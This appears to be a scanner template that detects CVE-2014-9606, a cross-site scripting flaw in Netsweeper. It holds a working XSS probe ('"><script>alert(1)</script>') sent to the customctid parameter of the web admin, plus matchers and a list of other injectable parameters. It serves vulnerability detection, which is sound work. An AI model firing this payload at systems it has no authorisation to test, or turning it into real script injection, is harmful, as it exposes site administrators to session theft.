id: CVE-2014-9606

info:
  name: Netsweeper 4.0.8 - Cross Site Scripting Injection
  author: daffainfo
  severity: medium
  reference: https://packetstormsecurity.com/files/download/133034/netsweeper-issues.tgz
  tags: cve,cve2014,netsweeper,xss
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.10
    cve-id: CVE-2014-9606
    cwe-id: CWE-79
  description: "Multiple cross-site scripting (XSS) vulnerabilities in Netsweeper before 3.1.10, 4.0.x before 4.0.9, and 4.1.x before 4.1.2 allow remote attackers to inject arbitrary web script or HTML via the (1) server parameter to remotereporter/load_logfiles.php, (2) customctid parameter to webadmin/policy/category_table_ajax.php, (3) urllist parameter to webadmin/alert/alert.php, (4) QUERY_STRING to webadmin/ajaxfilemanager/ajax_get_file_listing.php, or (5) PATH_INFO to webadmin/policy/policy_table_ajax.php/."

requests:
  - method: GET
    path:
      - '{{BaseURL}}/webadmin/policy/category_table_ajax.php?customctid=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"><script>alert(1)</script>'
        part: body

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200